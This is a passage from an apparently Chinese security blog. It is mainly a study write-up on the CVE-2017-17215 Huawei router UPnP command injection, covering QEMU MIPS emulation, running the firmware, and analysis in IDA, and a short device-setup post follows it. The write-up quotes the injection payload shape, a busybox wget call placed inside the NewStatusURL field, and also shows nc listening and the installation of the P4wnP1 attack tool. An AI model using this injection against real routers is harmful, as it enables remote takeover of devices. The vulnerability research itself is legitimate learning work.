+<figure class="highlight plain"><figcaption><span>qemu-system-mips -M malta -kernel vmlinux-2.6.32-5-4kc-malta -</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo qemu-system-mips -M malta -kernel vmlinux-2.6.32-5-4kc-malta -hda debian_squeeze_mips_standard.qcow2 -append &quot;root=/dev/sda1 console=tty0&quot; -net nic,macaddr=00:16:3e:00:00:01 -net tap</span><br><span class="line"></span><br><span class="line">sudo qemu-system-mips -M malta -kernel vmlinux-2.6.32-5-4kc-malta -hda debian_squeeze_mips_standard.qcow2 -append &quot;root=/dev/sda1 console=tty0&quot; -nographic</span><br></pre></td></tr></table></figure>
+<p>我下载的是debian_squeeze_mips_standard.qcow2和vmlinux-2.6.32-5-4kc-malta。</p>
+<p>好的，假如一切顺利，可以看到一个qemu虚拟机，</p>
+<p>用root/root登录进去:</p>
+<p><a href="https://image.3001.net/images/20180111/1515660657639.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20180111/1515660657639.png!small" alt="通过CVE-2017-17215学习路由器漏洞分析"></a></p>
+<p>发现网络不通，ifconfig -a 看一下发现网络接口为eth1：</p>
+<p><a href="https://image.3001.net/images/20180111/15156609745022.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20180111/15156609745022.png!small" alt="通过CVE-2017-17215学习路由器漏洞分析"></a></p>
+<p>将nano /etc/network/interfaces 文件中的eth0改为eth1：</p>
+<p><a href="https://image.3001.net/images/20180111/15156613687279.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20180111/15156613687279.png!small" alt="通过CVE-2017-17215学习路由器漏洞分析"></a></p>
+<p>再用ifup eth1  将eth1启起来，运气好的话此时网络已经好了。</p>
+<h1 id="（这部分是抄的，直接借鉴的）"><a href="#（这部分是抄的，直接借鉴的）" class="headerlink" title="（这部分是抄的，直接借鉴的）"></a><code>（这部分是抄的，直接借鉴的）</code></h1><h3 id="4-环境搭建好，进行实际操作"><a href="#4-环境搭建好，进行实际操作" class="headerlink" title="4. 环境搭建好，进行实际操作"></a>4. 环境搭建好，进行实际操作</h3><p>在已经登陆的qemu里输入,查看ip地址</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ifconfig -a</span><br></pre></td></tr></table></figure>
+<p><img src="http://pico0ziv8.bkt.clouddn.com/18-12-3/29942034.jpg" alt></p>
+<p>直接操作虚拟机显然比较麻烦，在ubuntu上搞个SSH 连进来</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh root@192.168.127.141</span><br></pre></td></tr></table></figure>
+<p>再次输入密码即可</p>
+<p>将之前解压的固件包拷贝到虚拟机里面：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scp -r ./squashfs-root  root@192.168.127.141:/root/</span><br></pre></td></tr></table></figure>
+<p>完成搭建路由器固件运行的环境。</p>
+<p>找到固件所在的位置，想直接执行下upnp这个文件，报错,缺少相应的so文件造成。</p>
+<p><a href="https://image.3001.net/images/20180111/15156686001122.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20180111/15156686001122.png!small" alt="图片.png"></a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chroot /root/squashfs-root /bin/sh</span><br></pre></td></tr></table></figure>
+<p>来切换根目录到路由器文件系统，执行成功：</p>
+<p><a href="https://image.3001.net/images/20180111/15156685477408.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20180111/15156685477408.png!small" alt="通过CVE-2017-17215学习路由器漏洞分析"></a><br>可是发包过去仍然失败，应该是并没有启动监听服务</p>
+<p>那找下端口37215</p>
+<p><a href="https://image.3001.net/images/20180111/15156662004916.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20180111/15156662004916.png!small" alt="通过CVE-2017-17215学习路由器漏洞分析"></a></p>
+<p>端口号只出现在mic文件内，看下文件内容：</p>
+<p><a href="https://image.3001.net/images/20180111/15156663101284.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20180111/15156663101284.png!small" alt="通过CVE-2017-17215学习路由器漏洞分析"></a></p>
+<p>看字符串像是一个跟网络服务相关的文件，试下运行一下：</p>
+<p><a href="https://image.3001.net/images/20180111/15156664767325.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20180111/15156664767325.png!small" alt="通过CVE-2017-17215学习路由器漏洞分析"></a></p>
+<p>看起来像是对了，</p>
+<p>ubuntu上nc -vlp 80 监听一下端口，跑一下exp，80端口收到路由器发来的wget 请求包。</p>
+<p><a href="https://image.3001.net/images/20180111/15156682779054.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20180111/15156682779054.png!small" alt="通过CVE-2017-17215学习路由器漏洞分析"></a></p>
+<p>4.简单分析：</p>
+<p>分析一下upnp中的关键代码:</p>
+<p><a href="https://image.3001.net/images/20180112/15157334268937.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20180112/15157334268937.png!small" alt="通过CVE-2017-17215学习路由器漏洞分析"></a></p>
+<p>根据上面payload图，newstatusurl这个节点值为 <newstatusurl>$(busybox wget -g xxxx ;xx;xx)</newstatusurl></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">snprintf(a0,0x400,&quot;upg -g -U %s -t &apos;1 Firmware Upgrade Image&apos; -c upnp -r %s -d -&quot;,a3)</span><br></pre></td></tr></table></figure>
+<p>其中a0是拷贝的源字符串的地址，同时a0又是system 调用的第一个参数。所以最后会执行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">system（a0）</span><br></pre></td></tr></table></figure>
+<p>如果看完整篇文章想上手试一下路由器漏洞的话，不要忘了当初你是为什么放弃的.</p>
+<h2 id="5-甩进ida分析"><a href="#5-甩进ida分析" class="headerlink" title="5.甩进ida分析"></a>5.甩进ida分析</h2><h5 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h5><p>根据 Check Point 的报告<a href="https://research.checkpoint.com/good-zero-day-skiddie/" target="_blank" rel="noopener">【1】</a>，该远程命令执行漏洞的漏洞点位于 UPnP 服务中。</p>
+<p>UPnP 是由“通用即插即用论坛”（UPnP™ Forum）推广的一套网络协议。该协议的目标是使家庭网络（数据共享、通信和娱乐）和公司网络中的各种设备能够相互无缝连接，并简化相关网络的实现。</p>
+<p>直接将固件中负责 UPnP 服务的 upnp 程序扔到 IDA。</p>
+<p>用IDA直接打开 /HG532eV100R001C01B020_upgrade_packet.bin.extracted/squashfs-root/bin</p>
+<p>1.通过字符串 <code>NewStatusURL</code> 对漏洞点进行定位。直接在ida中的空白处按入空格，由流程图模式改为汇编代码模式，按shift+f12打开String Windows窗口，再按入alt+t，然后直接搜索<code>NewStatus</code>来定位该漏洞位置。</p>
+<p><img src="http://pico0ziv8.bkt.clouddn.com/18-12-3/41289211.jpg" alt></p>
+<p>2.跟踪数据的引用地址</p>
+<p><img src="http://pico0ziv8.bkt.clouddn.com/18-12-3/72288694.jpg" alt></p>
+<p>3.找到漏洞点如下</p>
+<p><img src="http://pico0ziv8.bkt.clouddn.com/18-12-3/78152986.jpg" alt></p>
+<h1 id="2-学习IDA-Pro"><a href="#2-学习IDA-Pro" class="headerlink" title="2.学习IDA Pro"></a>2.学习IDA Pro</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ps：先去学习一下ida pro的用法。</span><br><span class="line">我的ida pro链接，直接拖到ubuntu点解idap即可运行</span><br><span class="line">不过64位需要安装一下依赖</span><br><span class="line"></span><br><span class="line">sudo dpkg --add-architecture i386</span><br><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install libc6-i686:i386 libexpat1:i386 libffi6:i386 libfontconfig1:i386 libfreetype6:i386 libgcc1:i386 libglib2.0-0:i386 libice6:i386 libpcre3:i386 libpng12-0:i386 libsm6:i386 libstdc++6:i386 libuuid1:i386 libx11-6:i386 libxau6:i386 libxcb1:i386 libxdmcp6:i386 libxext6:i386 libxrender1:i386 zlib1g:i386 libx11-xcb1:i386 libdbus-1-3:i386 libxi6:i386 libsm6:i386 libcurl3:i386</span><br></pre></td></tr></table></figure>
+<p>分析一下upnp中的关键代码:</p>
+<p><a href="https://image.3001.net/images/20180112/15157334268937.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20180112/15157334268937.png!small" alt="通过CVE-2017-17215学习路由器漏洞分析"></a></p>
+<p>根据上面payload图，newstatusurl这个节点值为 <newstatusurl>$(busybox wget -g xxxx ;xx;xx)</newstatusurl></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">snprintf(a0,0x400,&quot;upg -g -U %s -t &apos;1 Firmware Upgrade Image&apos; -c upnp -r %s -d -&quot;,a3)</span><br></pre></td></tr></table></figure>
+<p>其中a0是拷贝的源字符串的地址，同时a0又是system 调用的第一个参数。所以最后会执行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">system（a0）</span><br></pre></td></tr></table></figure>
+<p>(借的图片Orz)</p>
+<h3 id="IDA-Pro基本知识"><a href="#IDA-Pro基本知识" class="headerlink" title="IDA Pro基本知识"></a>IDA Pro基本知识</h3><h5 id="1-基本常识"><a href="#1-基本常识" class="headerlink" title="1. 基本常识"></a>1. 基本常识</h5><p><img src="http://pico0ziv8.bkt.clouddn.com/18-12-3/55458895.jpg" alt></p>
+<p>红色窗口为函数列表，一个文件被反编译后所有的函数列表都可以在此窗格中显示；</p>
+<p>蓝色窗口为汇编代码区，双击每个函数，可以看到对应函数对应的汇编代码段；</p>
+<p>黑色窗口为输出窗口，文件反汇编过程中的信息都可以在此窗口中看到。</p>
+<h3 id="3-安装buildroot的坑"><a href="#3-安装buildroot的坑" class="headerlink" title="3.安装buildroot的坑"></a>3.安装buildroot的坑</h3><p><img src="http://pico0ziv8.bkt.clouddn.com/18-12-8/82814804.jpg" alt></p>
+<p>安装buildroot的时候不要把安装包下载到win10，然后在复制到ubuntu，容易导致hash值发生变化，引发报错。。。。。</p>
+<p>啥系统软件，在啥系统内下载</p>
+<h4 id="1-MIPS交叉编译环境的搭建（Buildroot）"><a href="#1-MIPS交叉编译环境的搭建（Buildroot）" class="headerlink" title="1. MIPS交叉编译环境的搭建（Buildroot）"></a>1. MIPS交叉编译环境的搭建（Buildroot）</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">1.github的方式</span><br><span class="line"></span><br><span class="line"># 安装依赖库</span><br><span class="line">$ sudo apt-get update</span><br><span class="line">$ sudo apt-get install libncurses5-dev patch</span><br><span class="line"> </span><br><span class="line"># 下载源码</span><br><span class="line">$ git clone https://github.com/buildroot/buildroot.git</span><br><span class="line"> </span><br><span class="line"># 进行编译的配置</span><br><span class="line">$ cd buildroot</span><br><span class="line">$ make clean</span><br></pre></td></tr></table></figure>
+<h3 id="3-firmware-mod-kit工具的安装"><a href="#3-firmware-mod-kit工具的安装" class="headerlink" title="3. firmware-mod-kit工具的安装"></a>3. firmware-mod-kit工具的安装</h3><p>firmware-mod-kit工具的功能和binwalk工具的类似，其实firmware-mod-kit工具在功能上有调用binwalk工具提供的功能以及其他的固件解包工具的整合。下载firmware-mod-kit工具的源码进入到src目录下就能够看到firmware-mod-kit工具整合了那些固件提取和文件系统解压的工具。firmware-mod-kit工具的功能有固件文件的解包和打包、固件提取文件系统的解压和压缩、DD-WRT Web Pages的修改等，在每个整合的固件分析工具的源码文件夹里都有相关的使用说明。</p>
+<h4 id="1-安装依赖"><a href="#1-安装依赖" class="headerlink" title="1.安装依赖"></a>1.安装依赖</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">For Ubuntu 需要安装的依赖库文件</span><br><span class="line">sudo apt-get install git build-essential zlib1g-dev liblzma-dev python-magic</span><br></pre></td></tr></table></figure>
+<h4 id="4-下载安装"><a href="#4-下载安装" class="headerlink" title="4. 下载安装"></a>4. 下载安装</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/mirror/firmware-mod-kit.git</span><br><span class="line"> </span><br><span class="line"># 进入源码目录</span><br><span class="line">cd firmware-mod-kit/src</span><br><span class="line"> </span><br><span class="line"># 执行configure文件生成Makefile文件然后make编译生成可执行文件</span><br><span class="line">./configure &amp;&amp; make</span><br></pre></td></tr></table></figure>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://devil0x.github.io/2019/06/20/常用设备配置/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="devil0x">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="devil0x菜鸟">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2019/06/20/常用设备配置/" itemprop="url">设备常用配置</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-06-20T03:26:52+08:00">
+                2019-06-20
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h1 id="1-树莓派"><a href="#1-树莓派" class="headerlink" title="1.树莓派"></a>1.树莓派</h1><h2 id="wifi配置"><a href="#wifi配置" class="headerlink" title="wifi配置"></a>wifi配置</h2><p>修改wifi连接</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nano /etc/wpa_supplicant/wpa_supplicant.conf</span><br></pre></td></tr></table></figure>
+<p>设置wifi自动连接</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.cnblogs.com/visionsl/p/8117317.html</span><br></pre></td></tr></table></figure>
+<p>安装P4wnp1 </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get -y install git</span><br><span class="line">cd /home/pi</span><br><span class="line">git clone --recursive https://github.com/mame82/P4wnP1</span><br><span class="line">cd P4wnP1</span><br><span class="line">./install.sh</span><br></pre></td></tr></table></figure>
+<h2 id="2-kali更换国内源"><a href="#2-kali更换国内源" class="headerlink" title="2.kali更换国内源"></a>2.kali更换国内源</h2><h1 id="2-kali更换国内源-1"><a href="#2-kali更换国内源-1" class="headerlink" title="2.kali更换国内源"></a>2.kali更换国内源</h1><p>换中科大源</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">nano /etc/apt/sources.list</span><br><span class="line"></span><br><span class="line">deb http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib</span><br><span class="line">deb-src http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib</span><br><span class="line"></span><br><span class="line">签名错误</span><br><span class="line">wget -q -O - https://archive.kali.org/archive-key.asc | apt-key add</span><br><span class="line"></span><br><span class="line">apt-get update </span><br><span class="line">//刷新系统</span><br><span class="line"></span><br><span class="line">apt-get dist-upgrade</span><br><span class="line">//安装更新</span><br><span class="line"></span><br><span class="line"># python3下载</span><br><span class="line">下载源码</span><br><span class="line"></span><br><span class="line">cd Python-3.5.2</span><br><span class="line">./configure</span><br><span class="line">make</span><br><span class="line">make install</span><br><span class="line"></span><br><span class="line">Permission denied</span><br><span class="line">解决的办法：</span><br><span class="line">sudo chmod -R 777 configure</span><br></pre></td></tr></table></figure>
+<p>解决办法就是重新获取下签名key</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget -q -O - https://archive.kali.org/archive-key.asc | apt-key add</span><br></pre></td></tr></table></figure>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+  </section>
+
+  
+  <nav class="pagination">
+    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right"></i></a>
+  </nav>
+
+
+
+          </div>
+          
+
+
+          
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
     </div>
   </div>
-        <div class="sidebar-panel-tags">
-    <div class="sidebar-tags-name">
+
+  <aside id="sidebar" class="sidebar">
     
+    <div class="sidebar-inner">
+
+      
+
+      
+
+      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">devil0x</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">22</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+
+      
+
     </div>
-    <div class="iconfont-archer sidebar-tags-empty">&#xe678;</div>
-    <div class="tag-load-fail" style="display: none; color: #ccc; font-size: 0.6rem;">
-    缺失模块。<br/>
-    1、请确保node版本大于6.2<br/>
-    2、在博客根目录（注意不是archer根目录）执行以下命令：<br/>
-    <span style="color: #f75357; font-size: 1rem; line-height: 2rem;">npm i hexo-generator-json-content --save</span><br/>
-    3、在根目录_config.yml里添加配置：
-    <pre style="color: #787878; font-size: 0.6rem;">
-jsonContent:
-  meta: false
-  pages: false
-  posts:
-    title: true
-    date: true
-    path: true
-    text: false
-    raw: false
-    content: false
-    slug: false
-    updated: false
-    comments: false
-    link: false
-    permalink: false
-    excerpt: false
-    categories: true
-    tags: true</pre>
-    </div> 
-    <div class="sidebar-tags-list"></div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">devil0x</span>
+
+  
 </div>
-        <div class="sidebar-panel-categories">
-    <div class="sidebar-categories-name">
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
     
-    </div>
-    <div class="iconfont-archer sidebar-categories-empty">&#xe678;</div>
-    <div class="sidebar-categories-list"></div>
-</div>
-    </div>
-</div> 
-    <script>
-    var siteMeta = {
-        root: "/",
-        author: "devil0x"
-    }
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
 </script>
-    <!-- CDN failover -->
-    <script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script>
-    <script type="text/javascript">
-        if (typeof window.$ === 'undefined')
-        {
-            console.warn('jquery load from jsdelivr failed, will load local script')
-            document.write('<script src="/lib/jquery.min.js">\x3C/script>')
-        }
-    </script>
-    <script src="/scripts/main.js"></script>
-    <!-- algolia -->
-    
-    <!-- busuanzi  -->
-    
-    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
-    
-    <!-- CNZZ  -->
-    
-    </div>
-    <!-- async load share.js -->
-     
-    </body>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
 </html>
-
-
